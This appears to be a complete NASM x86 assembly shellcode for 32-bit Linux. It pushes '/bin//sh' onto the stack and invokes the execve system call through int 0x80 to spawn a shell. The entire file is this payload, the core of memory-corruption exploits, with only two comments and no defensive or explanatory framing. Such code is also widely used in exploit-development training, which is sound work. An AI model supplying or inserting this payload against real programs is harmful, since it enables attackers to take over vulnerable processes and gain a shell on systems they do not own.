section .text
  global _start

_start:
  xor eax, eax
  push eax

  push 0x68732f2f ;ascii to hex hs//
  push 0x6e69622f  ;ascii to hex nib/

  mov ebx, esp
  mov ecx, eax
  mov al, 0xb
  int 0x80
